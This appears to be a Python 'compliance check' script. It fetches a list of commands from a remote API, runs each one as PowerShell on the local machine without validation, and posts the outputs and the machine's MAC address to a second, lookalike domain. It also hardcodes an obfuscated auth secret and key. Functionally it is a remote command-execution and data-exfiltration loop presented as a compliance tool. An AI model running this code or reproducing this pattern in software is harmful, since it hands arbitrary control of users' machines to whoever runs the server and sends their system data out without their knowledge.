import subprocess
import requests
import base64
import json
from getmac import get_mac_address as gma

def run_powershell_command(command):
    # Define the PowerShell script
    powershell_script = f"""{command}"""

    # Run the PowerShell script using subprocess
    result = subprocess.run(["powershell", "-Command", powershell_script], capture_output=True, text=True)
    # Check the result
    if result.returncode == 0:
        # print(result.stdout.strip())
        if result.stdout.strip() == '1':
            return True
        elif result.stdout.strip() == '0':
            return False
        else:
            return result.stdout.strip()
    else:
        return f"Error: {result.stderr.strip()}"
    
def xor_encrypt(data, key):
    encrypted = ''
    for i in range(len(data)):
        encrypted += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    return base64.b64encode(encrypted.encode('utf-8')).decode('utf-8')

def call_complaince_parameters():
    auth_key = xor_encrypt(data_to_encrypt, key)
    complaince_check_data = {}
    print(auth_key)
    headers = {
        'Authorization': auth_key,
        'Content-Type': 'application/json'
    }
    response = requests.get(get_params_api_url, headers=headers)
    if response.json()['total_count']:
        for parameter in response.json()['results']:
            complaince_check_data[parameter['parameter_name']] = run_powershell_command(parameter['command'])
        payload = json.dumps({
            "mac_address": gma(),
            "complaince_data" : complaince_check_data
        })
        response = requests.post(post_params_api_url, headers=headers, data=payload)
        print(complaince_check_data)
    else:
        print("No complaince parameters present currently")

# Call the function and print the result
def main():
    call_complaince_parameters()

get_params_api_url = "https://api.nexon.ai/portal/api/v1/complaince/configuration/"
post_params_api_url = "https://ap.inexon.ai/portal/api/v1/sentiment/"
data_to_encrypt = "RmxSWnJJMGxBR3JOVWJrbmt4a3NzRlN3SmhRN1N0MlRhMUNld"
key = ".Gq0JGP`l&W`t+iLy4Td%-6v6%]tw*bnvn[-`&2kz5Be~2SnI"

# Call the main function
main()
